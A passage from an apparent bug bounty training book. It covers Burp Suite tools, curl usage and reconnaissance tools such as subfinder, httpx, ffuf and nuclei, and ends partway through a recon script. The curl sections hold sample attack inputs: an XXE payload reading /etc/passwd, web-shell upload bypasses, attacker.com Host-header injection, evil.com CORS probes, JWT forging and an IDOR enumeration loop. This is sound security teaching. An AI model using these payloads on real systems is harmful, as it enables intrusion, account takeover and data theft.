**Example — JWT token analysis:** JWT tokens look like: `eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UifQ.XYZ`

Parts separated by `.`:

1. Header: `eyJhbGciOiJIUzI1NiJ9`
2. Payload: `eyJ1c2VyIjoiYWxpY2UifQ`
3. Signature: `XYZ`

Paste `eyJ1c2VyIjoiYWxpY2UifQ` into Decoder, decode as Base64: Result: `{"user":"alice"}`

Now you know the JWT contains a username claim. Can you modify it to `{"user":"admin"}` and forge a valid token?

### 7. Comparer

Comparer lets you compare two pieces of text or binary data and highlights the differences.

**Use cases:**

- Compare responses when you are authorized vs. when you are not
- Compare the response when admin=true vs. admin=false
- Identify what changed between two requests

**How to use:**

1. Right-click a request or response → Send to Comparer
2. Do the same for a second request/response
3. Go to Comparer tab
4. Select the two items
5. Click "Words" to compare by words or "Bytes" to compare by bytes

### 8. Logger

Logger (Burp Logger++) provides a comprehensive log of all HTTP traffic, with better filtering than the Proxy history.

### 9. Extensions (BApp Store)

Burp Suite can be extended with plugins from the BApp Store.

**Most useful free extensions:**

|Extension|Purpose|
|---|---|
|**Autorize**|Automatically tests for authorization bypasses|
|**Param Miner**|Discovers hidden parameters|
|**JWT Editor**|Analyze and attack JWT tokens|
|**JSON Web Tokens**|JWT analysis and attacks|
|**Logger++**|Enhanced logging|
|**GAP**|Get all parameters from historical requests|
|**Active Scan++**|Enhanced active scanning (Pro)|
|**Turbo Intruder**|Very fast Intruder replacement|

**Installing extensions:**

1. Go to Extender → BApp Store
2. Find an extension
3. Click "Install"
4. Extension appears in Extender → Extensions

## Complete Bug Bounty Workflow with Burp Suite

**Phase 1: Discovery**

1. Set target in scope
2. Turn off intercept
3. Browse the entire application
4. Watch HTTP History populate
5. Take note of interesting endpoints, parameters, content types

**Phase 2: Analysis**

1. Review all requests in HTTP History
2. Note authentication mechanisms (cookies, tokens, headers)
3. Note all parameters in every request
4. Note interesting responses (admin-sounding paths, user data, errors)

**Phase 3: Testing**

1. Take an interesting request → Send to Repeater
2. Systematically test each parameter
3. Use Intruder for automated testing of lists
4. Use Decoder to decode/encode payloads
5. Use Comparer to compare responses

## Common Burp Suite Mistakes (and How to Avoid Them)

|Mistake|Impact|Fix|
|---|---|---|
|Leaving intercept ON|Browser appears frozen|Always turn intercept OFF unless actively intercepting|
|No scope defined|Log full of irrelevant traffic|Always define scope first|
|Forgetting to install CA cert|HTTPS sites show certificate errors|Install Burp CA cert in browser|
|Not saving projects|Lose all your work|Project → Save (Pro) or export history|
|Using Intruder for large attacks|Very slow in Community|Use ffuf for large-scale fuzzing|

## Practice Lab: Using Burp Suite with DVWA

Set up DVWA (Chapter 6), then:

1. Start Burp Suite, set scope to `http://localhost:80`
2. Turn intercept OFF, browse to DVWA
3. Log in with admin/password — watch the login request in HTTP History
4. Click on the login request — examine the request body and response
5. Right-click → Send to Repeater
6. In Repeater, change the password to `wrong` — click Send. Notice the 302 redirect to login
7. Change the password back to `password` — click Send. Notice the 302 redirect to index
8. Navigate to DVWA → SQL Injection
9. Type something in the User ID field
10. Find the request in HTTP History → Send to Repeater
11. Try different inputs in Repeater — observe the responses

## Summary

Burp Suite is the central tool for web application security testing. The Proxy intercepts traffic; HTTP History logs it; Repeater lets you modify and resend requests; Intruder automates fuzzing; Decoder handles encoding; Comparer identifies differences. Mastery of these tools is the foundation of professional bug bounty hunting.

## Checklist

- [ ] Burp Suite is open and browser is proxied to it
- [ ] CA certificate is installed — HTTPS sites load without errors
- [ ] Can set a scope and verify traffic is being filtered
- [ ] Can intercept, modify, and forward a request
- [ ] Can find a request in HTTP History and send it to Repeater
- [ ] Can modify a request in Repeater and observe different responses
- [ ] Can set up an Intruder attack with a payload list
- [ ] Can decode a Base64 string in Decoder
- [ ] Can compare two responses in Comparer
- [ ] Have installed at least 3 extensions (Autorize, Param Miner, JWT Editor)

---
# Chapter 8: curl and the Command Line

## Objective

Master curl — the command-line HTTP client used by every professional security researcher. Learn how to craft, send, and analyze HTTP requests from the terminal, and how to integrate curl into automation pipelines and bug bounty workflows.

## Prerequisites

- Chapter 5: Linux for Bug Bounty Hunters
- Chapter 3: HTTP — The Language of the Web

## Terminology

|Term|Definition|
|---|---|
|**curl**|A command-line tool for transferring data with URLs — supports HTTP, HTTPS, FTP, and more|
|**Flag / Option**|A modifier passed to curl that changes its behavior (e.g., `-X`, `-H`, `-d`)|
|**Request Header**|A key-value pair sent with the HTTP request (e.g., `Authorization`, `Content-Type`)|
|**Response Header**|A key-value pair returned by the server in the HTTP response|
|**Verbose Mode**|curl's `-v` flag — shows the full request and response including headers|
|**Silent Mode**|curl's `-s` flag — suppresses progress output, useful in scripts|
|**Follow Redirect**|curl's `-L` flag — automatically follows HTTP 301/302 redirects|
|**Cookie Jar**|A file that stores cookies across multiple curl requests|
|**Data / Body**|The request body sent with POST/PUT requests (`-d` flag)|
|**Proxy**|Routing curl traffic through Burp Suite for interception (`--proxy`)|

---

## Theory

### Why curl Matters for Bug Bounty

Burp Suite is your primary tool for interactive testing, but curl is indispensable for:

- **Automation** — scripting repetitive requests without a GUI
- **Quick checks** — testing a single endpoint from the terminal in seconds
- **Pipeline integration** — piping output from recon tools into curl for validation
- **Reproducing findings** — generating curl one-liners to include in bug reports
- **Header manipulation** — sending precise, custom HTTP requests with full control

Understanding curl deeply also reinforces your understanding of HTTP itself — every flag maps directly to an HTTP concept covered in Chapter 3.

---

## Core curl Syntax

```bash
curl [OPTIONS] URL
```

The URL is always the final argument. Options come before it.

---

## Essential Flags — The Daily Toolkit

### Viewing the Response

```bash
# Basic GET request — outputs response body to terminal
curl https://example.com

# Include response headers in output
curl -i https://example.com

# Show ONLY response headers (sends HEAD request)
curl -I https://example.com

# Verbose mode — shows full request AND response headers
curl -v https://example.com

# Even more verbose (shows TLS handshake details)
curl -vvv https://example.com

# Silent mode — suppress progress meter (useful in scripts)
curl -s https://example.com

# Silent but still show errors
curl -sS https://example.com
```

### Saving Output

```bash
# Save response body to a file
curl -o output.html https://example.com

# Save with the remote filename
curl -O https://example.com/report.pdf

# Save headers to one file, body to another
curl -D headers.txt -o body.html https://example.com
```

### Following Redirects

```bash
# Follow redirects automatically (critical for testing login flows)
curl -L https://example.com/login

# Follow redirects and show all intermediate responses
curl -Liv https://example.com/login
```

---

## HTTP Methods

```bash
# GET (default)
curl https://example.com/api/users

# POST
curl -X POST https://example.com/api/login

# PUT
curl -X PUT https://example.com/api/users/123

# DELETE
curl -X DELETE https://example.com/api/users/123

# PATCH
curl -X PATCH https://example.com/api/users/123

# OPTIONS (useful for CORS testing)
curl -X OPTIONS https://example.com/api/users -v

# HEAD
curl -X HEAD https://example.com/ -v
```

---

## Sending Data (Request Bodies)

### URL-Encoded Form Data

```bash
# Standard form POST (Content-Type: application/x-www-form-urlencoded)
curl -X POST https://example.com/login \
  -d "username=alice&password=secret"

# curl sets Content-Type automatically when using -d
# Equivalent explicit version:
curl -X POST https://example.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=alice&password=secret"
```

### JSON Data

```bash
# POST JSON body (must set Content-Type manually)
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "email": "alice@test.com"}'

# Read JSON body from a file
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d @payload.json
```

### Multipart Form Data (File Uploads)

```bash
# Upload a file
curl -X POST https://example.com/upload \
  -F "file=@/path/to/shell.php" \
  -F "description=test"

# Upload with a custom filename (to test extension bypass)
curl -X POST https://example.com/upload \
  -F "file=@shell.php;filename=shell.php.jpg"

# Upload with a custom Content-Type (to test MIME validation)
curl -X POST https://example.com/upload \
  -F "file=@shell.php;type=image/jpeg"
```

### Raw Body

```bash
# Send a raw XML body
curl -X POST https://example.com/api \
  -H "Content-Type: application/xml" \
  --data-raw '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

---

## Setting Headers

```bash
# Add a single custom header
curl https://example.com/api/profile \
  -H "Authorization: Bearer eyJhbGci..."

# Add multiple headers
curl https://example.com/api/profile \
  -H "Authorization: Bearer eyJhbGci..." \
  -H "X-Custom-Header: test" \
  -H "Accept: application/json"

# Override the User-Agent
curl https://example.com \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Test CORS with a crafted Origin header
curl -v https://api.example.com/data \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer TOKEN"

# Host header injection test
curl https://example.com/reset-password \
  -X POST \
  -H "Host: attacker.com" \
  -d "email=victim@example.com"

# X-Forwarded-For bypass attempt
curl https://example.com/admin \
  -H "X-Forwarded-For: 127.0.0.1"
```

---

## Working with Cookies

```bash
# Send a specific cookie
curl https://example.com/dashboard \
  -H "Cookie: session=abc123def456"

# Or using the -b flag
curl https://example.com/dashboard \
  -b "session=abc123def456"

# Save cookies to a file (cookie jar)
curl -c cookies.txt https://example.com/login \
  -X POST \
  -d "username=alice&password=secret"

# Load and save cookies (full session simulation)
curl -b cookies.txt -c cookies.txt https://example.com/dashboard

# Multiple cookies
curl https://example.com \
  -b "session=abc123; role=user; remember=true"
```

---

## TLS / SSL Options

```bash
# Ignore SSL certificate errors (for testing with self-signed certs)
curl -k https://dev.example.com

# Specify a client certificate
curl https://example.com \
  --cert client.crt \
  --key client.key

# Show TLS certificate information
curl -vI https://example.com 2>&1 | grep -A 20 "Server certificate"

# Force a specific TLS version
curl --tlsv1.2 https://example.com
curl --tlsv1.3 https://example.com
```

---

## Routing Through Burp Suite

The most important curl trick for bug bounty: route your curl requests through Burp for interception and analysis.

```bash
# Route through Burp Suite (default proxy: 127.0.0.1:8080)
curl https://example.com \
  --proxy http://127.0.0.1:8080 \
  -k

# The -k flag is required because Burp uses its own CA certificate

# Route through Burp with authentication
curl https://example.com/api/data \
  --proxy http://127.0.0.1:8080 \
  -k \
  -H "Authorization: Bearer TOKEN"

# Alias to make this easier (add to ~/.bashrc)
alias burpcurl='curl --proxy http://127.0.0.1:8080 -k'
# Then use:
burpcurl https://example.com/api/data -H "Authorization: Bearer TOKEN"
```

---

## Output Formatting and Processing

```bash
# Format the response time (useful for timing attacks)
curl -o /dev/null -s -w "Time: %{time_total}s\nStatus: %{http_code}\n" \
  https://example.com/login \
  -X POST \
  -d "username=admin&password=wrong"

# Available write-out variables:
# %{http_code}     - Response status code
# %{time_total}    - Total time in seconds
# %{time_connect}  - TCP connection time
# %{size_download} - Response body size in bytes
# %{url_effective} - Final URL after redirects

# Pipe JSON response to jq for formatting
curl -s https://api.example.com/users \
  -H "Authorization: Bearer TOKEN" | jq .

# Extract a specific field
curl -s https://api.example.com/users/me \
  -H "Authorization: Bearer TOKEN" | jq '.email'

# Extract all emails from a list
curl -s https://api.example.com/users \
  -H "Authorization: Bearer TOKEN" | jq '.[].email'
```

---

## Rate Limiting and Timing

```bash
# Add a delay between requests (to avoid triggering rate limits)
curl --limit-rate 100K https://example.com

# Set connection and read timeouts
curl --connect-timeout 10 --max-time 30 https://example.com

# Retry on failure
curl --retry 3 --retry-delay 2 https://example.com
```

---

## Practical Bug Bounty Workflows

### Testing IDOR in a Loop

```bash
#!/bin/bash
# Test access to orders 5000-5050 using Account A's session
SESSION="ACCOUNT_A_SESSION_TOKEN"

for id in $(seq 5000 5050); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://example.com/api/orders/$id" \
    -H "Cookie: session=$SESSION")
  
  if [ "$STATUS" = "200" ]; then
    echo "[POTENTIAL IDOR] Order $id returned 200"
    curl -s "https://example.com/api/orders/$id" \
      -H "Cookie: session=$SESSION" | jq '.user_id'
  fi
done
```

### Testing for Reflected Headers

```bash
# Test if User-Agent is reflected in the response
curl -s https://example.com/error \
  -H "User-Agent: REFLECTED_TEST_12345" | grep "REFLECTED_TEST_12345"

# Test if X-Forwarded-For is reflected
curl -s https://example.com/profile \
  -H "X-Forwarded-For: XFFTEST99999" \
  -H "Cookie: session=TOKEN" | grep "XFFTEST99999"
```

### Testing Password Reset for Host Header Injection

```bash
curl -v -X POST https://example.com/reset-password \
  -H "Host: YOUR-COLLABORATOR.burpcollaborator.net" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=your-test-account@example.com"

# Watch your Collaborator server for a DNS/HTTP hit containing the reset token
```

### Generating curl Commands from Burp

In Burp Suite, right-click any request → **Copy as curl command**. This gives you a ready-to-run curl one-liner with all headers and body preserved — perfect for including in bug reports as a reproducible proof of concept.

### SSRF Testing

```bash
# Test SSRF by submitting your Collaborator URL as the target
curl -s -X POST https://example.com/api/fetch \
  -H "Content-Type: application/json" \
  -H "Cookie: session=TOKEN" \
  -d '{"url": "http://YOUR-COLLABORATOR.burpcollaborator.net/ssrf-test"}'
```

### Timing Attack for Username Enumeration

```bash
#!/bin/bash
# Compare response times for existing vs non-existing usernames

echo "=== Testing existing username ==="
curl -o /dev/null -s -w "Time: %{time_total}s\n" \
  -X POST https://example.com/login \
  -d "username=known@example.com&password=wrongpassword"

echo "=== Testing non-existing username ==="
curl -o /dev/null -s -w "Time: %{time_total}s\n" \
  -X POST https://example.com/login \
  -d "username=doesnotexist@example.com&password=wrongpassword"

# If times differ consistently → username enumeration via timing
```

---

## Quick Reference Card

```bash
# GET with auth
curl -s https://api.example.com/me -H "Authorization: Bearer TOKEN"

# POST JSON
curl -s -X POST https://api.example.com/data \
  -H "Content-Type: application/json" \
  -d '{"key":"value"}' \
  -H "Cookie: session=TOKEN"

# Check headers only
curl -sI https://example.com

# Follow redirects + verbose
curl -Lv https://example.com/login

# Through Burp
curl -sk --proxy http://127.0.0.1:8080 https://example.com/api/data

# Get status code only
curl -s -o /dev/null -w "%{http_code}" https://example.com/path

# Upload file
curl -s -X POST https://example.com/upload \
  -F "file=@test.jpg" \
  -H "Cookie: session=TOKEN"

# Test CORS
curl -sv https://api.example.com/data \
  -H "Origin: https://evil.com" | grep -i "access-control"
```

---

## Summary

curl is the Swiss Army knife of HTTP testing. It lets you craft precise HTTP requests from the command line — any method, any header, any body, any cookie. In bug bounty, it is essential for quick endpoint validation, automation scripting, IDOR loops, header injection testing, and generating reproducible proof-of-concept commands for reports. Routing curl through Burp (`--proxy http://127.0.0.1:8080 -k`) lets you capture and inspect every request interactively. The `-w` write-out format enables timing attacks and automated response analysis. Master curl and your testing speed increases dramatically.

---

## Checklist

- [ ] Can send a basic GET request and view the response body
- [ ] Can send a POST request with a JSON body and custom headers
- [ ] Can send a POST request with URL-encoded form data
- [ ] Can upload a file using multipart form data
- [ ] Can set custom headers (Authorization, Cookie, Origin, Host)
- [ ] Can view only response headers with `-I`
- [ ] Can run curl in verbose mode (`-v`) and read the full transaction
- [ ] Can follow redirects with `-L`
- [ ] Can save response body and headers to files
- [ ] Can route curl through Burp Suite (`--proxy http://127.0.0.1:8080 -k`)
- [ ] Can use `-w` to extract response status codes and timing
- [ ] Can pipe curl output to `jq` for JSON processing
- [ ] Can write a simple bash loop using curl to test multiple IDs
- [ ] Know how to generate a curl command from Burp Suite (Copy as curl)
---

# Chapter 9: Reconnaissance Tools

## Objective

Build a complete mental map of the core reconnaissance tool ecosystem — what each tool does, when to use it, how to use it effectively, and how tools chain together into a coherent recon workflow. By the end of this chapter you will know exactly which tool to reach for at every stage of reconnaissance.

## Prerequisites

- Chapter 5: Linux for Bug Bounty Hunters
- Chapter 6: Setting Up Your Lab Environment
- Chapter 8: curl and the Command Line

## Terminology

|Term|Definition|
|---|---|
|**Recon**|Short for reconnaissance — the information-gathering phase before active testing|
|**Passive tool**|A tool that collects information without sending traffic to the target|
|**Active tool**|A tool that sends traffic directly to the target|
|**Pipeline**|Chaining multiple tools so the output of one feeds the input of the next|
|**Wordlist**|A file of words, paths, or values used as input for fuzzing and brute-forcing|
|**Rate limiting**|Intentionally throttling how fast a tool sends requests|
|**Go tool**|A tool written in Go — fast, single-binary, easy to install|
|**API key**|A credential required by some tools to access paid data sources|
|**SecLists**|A widely-used collection of security wordlists maintained by Daniel Miessler|
|**ProjectDiscovery**|A team that builds many of the most popular open-source bug bounty recon tools|

---

## Theory

### The Recon Tool Ecosystem

Reconnaissance tools fall into four categories:

```
1. SUBDOMAIN DISCOVERY     → Find all subdomains of the target
2. HTTP PROBING            → Determine which hosts are alive and what they serve
3. URL / CONTENT DISCOVERY → Find paths, files, endpoints, and parameters
4. INFORMATION EXTRACTION  → Pull secrets, endpoints, and data from responses
```

No single tool does everything well. Professional researchers chain tools together, with the output of each stage feeding the next.

---

## Category 1: Subdomain Discovery

### subfinder

**What it does:** Queries dozens of passive data sources simultaneously — certificate transparency logs, DNS datasets, search engines, and public APIs — to find subdomains without touching the target.

**When to use it:** First step of every engagement. Fast, passive, reliable.

```bash
# Install
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Basic usage
subfinder -d example.com

# Save to file
subfinder -d example.com -o subdomains.txt

# Silent mode (output only, no banner)
subfinder -d example.com -silent -o subdomains.txt

# Multiple domains from a file
subfinder -dL domains.txt -silent -o all_subdomains.txt

# Use all sources (slower but more complete)
subfinder -d example.com -all -silent

# Verbose — see which source found which subdomain
subfinder -d example.com -v
```

**Configure API keys for more sources** (`~/.config/subfinder/provider-config.yaml`):

```yaml
shodan:
  - YOUR_SHODAN_KEY
censys:
  - CENSYS_ID:CENSYS_SECRET
github:
  - YOUR_GITHUB_TOKEN
securitytrails:
  - YOUR_ST_KEY
```

---

### amass

**What it does:** The most comprehensive subdomain enumeration tool — combines passive sources, active DNS resolution, brute-forcing, and graph-based analysis. Slower than subfinder but finds more.

**When to use it:** For thorough engagements where completeness matters more than speed.

```bash
# Install
go install -v github.com/owasp-amass/amass/v4/...@master

# Passive only (no target interaction)
amass enum -passive -d example.com -o amass_results.txt

# Active enumeration (includes DNS brute-force)
amass enum -active -d example.com -o amass_active.txt

# Brute-force with a wordlist
amass enum -brute -d example.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# Track changes over time (uses a local database)
amass enum -d example.com -dir ~/.amass/example.com

# Intelligence gathering (find related domains by ASN/org)
amass intel -org "Example Corp"
amass intel -asn 12345
```

---

### assetfinder

**What it does:** Lightweight, fast passive subdomain finder using a smaller set of sources. Good for quick checks.

```bash
# Install
go install -v github.com/tomnomnom/assetfinder@latest

# Find all related domains (may include parent domains)
assetfinder example.com

# Only return subdomains of the target
assetfinder --subs-only example.com > assetfinder.txt
```

---

### crt.sh (Certificate Transparency)

**What it does:** Queries the public certificate transparency log database directly. Finds subdomains from SSL/TLS certificate records — including historical ones.

```bash
# Command-line query
curl -s "https://crt.sh/?q=%.example.com&output=json" \
  | jq -r '.[].name_value' \
  | sed 's/\*\.//g' \
  | sort -u > crtsh.txt

# Filter for unique clean results
curl -s "https://crt.sh/?q=%.example.com&output=json" \
  | jq -r '.[].name_value' \
  | sed 's/\*\.//g' \
  | grep -v "^$" \
  | sort -u
```

---

## Category 2: HTTP Probing

### httpx

**What it does:** Takes a list of hostnames or URLs and probes each one over HTTP/HTTPS, returning status codes, titles, technologies, and other metadata. The essential filter between "subdomains found" and "live targets worth testing."

**When to use it:** Always — run every subdomain list through httpx before doing anything else.

```bash
# Install
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Basic alive check
cat subdomains.txt | httpx -silent

# Include status code and page title
cat subdomains.txt | httpx -silent -sc -title

# Include content length
cat subdomains.txt | httpx -silent -sc -title -cl

# Detect technologies (Wappalyzer-style)
cat subdomains.txt | httpx -silent -tech-detect

# Full output — status, title, content-length, tech
cat subdomains.txt | httpx -silent -sc -title -cl -tech-detect -o live.txt

# Follow redirects
cat subdomains.txt | httpx -silent -follow-redirects -sc -title

# Only show specific status codes
cat subdomains.txt | httpx -silent -mc 200,403

# JSON output for processing
cat subdomains.txt | httpx -silent -json -o results.json

# Set rate limit (requests per second)
cat subdomains.txt | httpx -silent -rl 50 -sc -title

# Take screenshots (requires chromium)
cat subdomains.txt | httpx -silent -screenshot -srd screenshots/
```

---

### gowitness

**What it does:** Takes screenshots of web pages at scale. Invaluable for visually reviewing dozens or hundreds of hosts quickly — you can spot admin panels, login pages, and interesting apps far faster than visiting each one manually.

```bash
# Install
go install github.com/sensepost/gowitness@latest

# Screenshot a single URL
gowitness single https://example.com

# Screenshot a list of URLs
gowitness file -f live_hosts.txt

# Screenshot a list and generate an HTML report
gowitness file -f live_hosts.txt --write-db
gowitness report serve   # Opens a browser-based report at localhost:7171

# Screenshot with custom resolution
gowitness file -f live_hosts.txt --resolution 1920x1080
```

---

## Category 3: URL and Content Discovery

### ffuf (Fast Web Fuzzer)

**What it does:** Sends many requests with varied payloads to discover hidden paths, files, parameters, subdomains, and more. The most versatile fuzzer in the toolkit.

**When to use it:** Directory/file discovery, parameter fuzzing, virtual host discovery.

```bash
# Install
go install -v github.com/ffuf/ffuf/v2@latest

# Basic directory fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u https://example.com/FUZZ

# Filter out 404s by size (find the 404 page size first, then exclude it)
ffuf -w wordlist.txt -u https://example.com/FUZZ -fs 1234

# Show only specific status codes
ffuf -w wordlist.txt -u https://example.com/FUZZ -mc 200,301,302,403

# Recursive fuzzing
ffuf -w wordlist.txt -u https://example.com/FUZZ \
     -recursion -recursion-depth 3 -mc 200,301,302,403

# Fuzz file extensions
ffuf -w wordlist.txt -u https://example.com/FUZZ \
     -e .php,.html,.js,.json,.bak,.env,.xml -mc 200,301,302,403

# Fuzz a POST parameter
ffuf -w payloads.txt \
     -u https://example.com/login \
     -X POST \
     -d "username=FUZZ&password=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mc 200

# Fuzz a JSON parameter
ffuf -w payloads.txt \
     -u https://example.com/api/login \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"FUZZ","password":"test"}' \
     -mc 200

# Virtual host discovery (subdomain brute-force via Host header)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://example.com \
     -H "Host: FUZZ.example.com" \
     -mc 200,301,302,403 \
     -fs 1234   # Filter out the default response size

# Save results to JSON
ffuf -w wordlist.txt -u https://example.com/FUZZ -o results.json -of json

# Rate limit (requests per second)
ffuf -w wordlist.txt -u https://example.com/FUZZ -rate 100
```

**Recommended wordlists:**

|Wordlist|Use Case|
|---|---|
|`Discovery/Web-Content/common.txt`|Fast initial scan (~4,700 words)|
|`Discovery/Web-Content/directory-list-2.3-medium.txt`|Thorough (~220,000 words)|
|`Discovery/Web-Content/raft-large-files.txt`|File discovery|
|`Discovery/Web-Content/burp-parameter-names.txt`|Parameter fuzzing|
|`Discovery/DNS/subdomains-top1million-5000.txt`|Fast DNS brute-force|

---

### waybackurls

**What it does:** Queries the Wayback Machine (web.archive.org) for all URLs ever crawled for a domain. Reveals historical endpoints, old API versions, and forgotten paths.

```bash
# Install
go install -v github.com/tomnomnom/waybackurls@latest

# Basic usage
echo "example.com" | waybackurls

# Save to file
echo "example.com" | waybackurls > wayback.txt

# Filter for interesting file types
echo "example.com" | waybackurls | grep -E "\.(js|json|php|env|bak|sql|xml|conf)$"

# Filter for parameterized URLs (injection points)
echo "example.com" | waybackurls | grep "?" | sort -u
```

---

### gau (Get All URLs)

**What it does:** Fetches URLs from multiple sources simultaneously — Wayback Machine, Common Crawl, URLScan.io, and AlienVault OTX. More comprehensive than waybackurls alone.

```bash
# Install
go install -v github.com/lc/gau/v2/cmd/gau@latest

# Basic usage
echo "example.com" | gau

# Include subdomains
echo "example.com" | gau --subs

# Filter by file extension
echo "example.com" | gau | grep "\.js$"

# Combine with waybackurls for maximum coverage
echo "example.com" | waybackurls > urls1.txt
echo "example.com" | gau > urls2.txt
cat urls1.txt urls2.txt | sort -u > all_urls.txt
```

---

### katana

**What it does:** A modern web crawler that actively browses an application — following links, executing JavaScript, and extracting URLs from both HTML and JavaScript code. Essential for single-page applications (SPAs) where traditional crawlers miss most content.

```bash
# Install
go install -v github.com/projectdiscovery/katana/cmd/katana@latest

# Basic crawl
katana -u https://example.com

# Headless mode (executes JavaScript — required for SPAs)
katana -u https://example.com -headless

# Increase crawl depth
katana -u https://example.com -depth 5

# Extract endpoints from JavaScript files
katana -u https://example.com -js-crawl

# Full recommended command
katana -u https://example.com \
       -depth 5 \
       -headless \
       -js-crawl \
       -silent \
       -o katana_output.txt

# Crawl multiple targets
katana -list live_hosts.txt -headless -js-crawl -o all_crawled.txt
```

---

### Arjun

**What it does:** Discovers hidden HTTP parameters by trying thousands of common parameter names and observing changes in the response. Finds parameters the application accepts but does not advertise.

```bash
# Install
pip3 install arjun --break-system-packages

# Discover GET parameters
arjun -u https://example.com/api/users

# Discover POST parameters
arjun -u https://example.com/api/users -m POST

# JSON mode
arjun -u https://example.com/api/users -m JSON

# Multiple URLs from a file
arjun --urls parameterized_urls.txt

# Use a custom wordlist
arjun -u https://example.com/profile \
      -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

---

## Category 4: Information Extraction

### nuclei

**What it does:** A template-based vulnerability scanner. Each template targets a specific misconfiguration or vulnerability pattern. The community maintains thousands of templates covering everything from exposed admin panels to known CVEs.

**When to use it:** Automated baseline scanning on all live hosts. Not a replacement for manual testing — treat results as leads to investigate, not confirmed vulnerabilities.

```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Update templates (run frequently)
nuclei -update-templates

# Scan a single target
nuclei -u https://example.com

# Scan a list of targets
nuclei -l live_hosts.txt

# Filter by severity
nuclei -l live_hosts.txt -severity critical,high

# Run specific template categories
nuclei -l live_hosts.txt -t ~/nuclei-templates/exposures/
nuclei -l live_hosts.txt -t ~/nuclei-templates/misconfiguration/
nuclei -l live_hosts.txt -t ~/nuclei-templates/takeovers/

# Save output
nuclei -l live_hosts.txt -severity critical,high -o nuclei_findings.txt

# Rate limit (important — don't hammer the target)
nuclei -l live_hosts.txt -rate-limit 50

# Use Burp as proxy to capture nuclei traffic
nuclei -u https://example.com -proxy http://127.0.0.1:8080
```

---

### dnsx

**What it does:** A fast DNS toolkit for resolving large lists of hostnames, checking specific record types, and extracting DNS data at scale.

```bash
# Install
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest

# Resolve a list of hostnames (check if they have A records)
cat subdomains.txt | dnsx -silent -a -resp-only

# Get CNAME records (important for subdomain takeover detection)
cat subdomains.txt | dnsx -silent -cname -resp

# Get all record types
cat subdomains.txt | dnsx -silent -a -aaaa -cname -mx -ns -resp

# Filter for wildcard DNS (some domains resolve *.example.com to catch-all)
dnsx -d example.com -wt -silent

# Resolve and save
cat subdomains.txt | dnsx -silent -a -o resolved.txt
```

---

### anew

**What it does:** Appends only new (previously unseen) lines to a file. Essential for change detection — running scans repeatedly and only alerting on new results.

```bash
# Install
go install -v github.com/tomnomnom/anew@latest

# First run: everything is new
cat today_subdomains.txt | anew baseline.txt > new_subdomains.txt

# Second run: only truly new subdomains appear
cat tomorrow_subdomains.txt | anew baseline.txt > new_subdomains.txt

# Check what's new without updating the baseline (dry run)
cat new_results.txt | anew -d baseline.txt
```

---

### gf (grep patterns)

**What it does:** Applies predefined grep patterns to URL lists to find parameters likely vulnerable to specific vulnerability classes. Written by tomnomnom.

```bash
# Install
go install -v github.com/tomnomnom/gf@latest

# Clone the gf-patterns repository
git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf

# Find URLs likely vulnerable to XSS
cat all_urls.txt | gf xss

# Find URLs likely vulnerable to SSRF
cat all_urls.txt | gf ssrf

# Find URLs with redirect parameters (open redirect)
cat all_urls.txt | gf redirect

# Find URLs with SQL-injection-prone parameters
cat all_urls.txt | gf sqli

# Available patterns (varies by gf-patterns repo)
# xss, sqli, ssrf, redirect, lfi, rce, idor, debug_logic, img-traversal, ...
```

---

## Putting It Together: The Complete Recon Pipeline

```bash
#!/bin/bash
TARGET="example.com"
DIR="$HOME/bugbounty/targets/$TARGET/recon"
mkdir -p $DIR

echo "[*] === RECON PIPELINE: $TARGET ==="

# 1. Subdomain enumeration
echo "[*] Collecting subdomains..."
subfinder -d $TARGET -silent > $DIR/subfinder.txt
assetfinder --subs-only $TARGET > $DIR/assetfinder.txt
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > $DIR/crtsh.txt

cat $DIR/subfinder.txt $DIR/assetfinder.txt $DIR/crtsh.txt \
  | sort -u > $DIR/all_subdomains.txt
echo "[+] Unique subdomains: $(wc -l < $DIR/all_subdomains.txt)"

# 2. HTTP probing
echo "[*] Probing live hosts..."
cat $DIR/all_subdomains.txt | httpx -silent -sc -title -cl \
  -o $DIR/live_hosts.txt
echo "[+] Live hosts: $(wc -l < $DIR/live_hosts.txt)"

# 3. Screenshots
echo "[*] Taking screenshots..."
cat $DIR/live_hosts.txt | awk '{print $1}' | \
  gowitness file -f /dev/stdin --write-db

# 4. Historical URLs
echo "[*] Collecting historical URLs..."
echo $TARGET | waybackurls > $DIR/wayback.txt
echo $TARGET | gau --subs >> $DIR/wayback.txt
cat $DIR/wayback.txt | sort -u > $DIR/all_urls.txt
echo "[+] Historical URLs: $(wc -l < $DIR/all_urls.txt)"

# 5. Filter interesting URLs
cat $DIR/all_urls.txt | grep "?" | sort -u > $DIR/parameterized.txt
cat $DIR/all_urls.txt | grep -E "\.(js)$" | sort -u > $DIR/js_files.txt
cat $DIR/all_urls.txt | gf ssrf > $DIR/ssrf_candidates.txt
cat $DIR/all_urls.txt | gf xss > $DIR/xss_candidates.txt
cat $DIR/all_urls.txt | gf redirect > $DIR/redirect_candidates.txt

# 6. Content discovery on live hosts
echo "[*] Fuzzing directories on live hosts..."
